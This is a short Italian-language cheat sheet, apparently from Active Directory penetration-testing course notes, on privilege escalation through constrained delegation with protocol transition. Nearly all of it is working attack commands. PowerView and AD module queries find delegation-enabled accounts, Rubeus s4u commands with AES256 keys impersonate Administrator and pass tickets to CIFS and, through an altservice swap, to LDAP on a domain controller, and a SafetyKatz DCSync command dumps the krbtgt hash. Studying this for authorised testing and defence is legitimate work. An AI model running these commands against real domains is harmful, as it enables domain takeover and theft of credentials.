# Priv Esc - Constrained Delegation with Protocol Transition - Abusing

#### Enumerare utenti e computer con Constrained Delegation abilitata

* PowerView

```powershell
Get-DomainUser -TrustedToAuth
```

```powershell
Get-DomainComputer -TrustedToAuth
```

* Active Directory Module

```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

#### Richiedere TGT e TGS

```powershell
Rubeus.exe s4u /user:websvc
/aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e87
9470ade07e5412d7 /impersonateuser:Administrator
/msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL
/ptt
```

```powershell
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

* Un aspetto interessante e' legato al fatto che gli SPN nel TGS sono in cleartext.

#### Richiesta di con S4U per servizio specifico

```powershell
Rubeus.exe s4u /user:dcorp-adminsrv$
/aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e04
1d0278d30dc1b445 /impersonateuser:Administrator
/msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL
/altservice:ldap /ptt
```

#### E' possibile eseguire DCSync dopo aver caricato il token

```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```
